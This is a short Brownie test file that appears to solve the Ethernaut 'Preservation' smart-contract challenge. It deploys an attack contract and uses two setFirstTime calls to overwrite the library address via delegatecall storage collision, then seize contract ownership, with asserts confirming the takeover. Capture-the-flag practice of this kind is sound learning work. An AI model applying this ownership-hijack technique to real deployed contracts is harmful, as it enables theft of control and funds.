from brownie import accounts, convert, Preservation, PreservationAttack, LibraryContract

def test_attack():
    owner = accounts[0]
    hacker = accounts[1]
    library1 = LibraryContract.deploy({'from': owner})
    library2 = LibraryContract.deploy({'from': owner})
    hack = PreservationAttack.deploy({'from': hacker})
    target = Preservation.deploy(library1, library2, {'from': owner})
    assert target.owner() == owner
    first_one = convert.to_uint(convert.to_bytes(hack.address))
    target.setFirstTime(first_one, {'from': hacker})
    assert target.timeZone1Library() == hack
    second_one = convert.to_uint(convert.to_bytes(hacker.address))
    target.setFirstTime(second_one, {'from': hacker})
    assert target.owner() == hacker


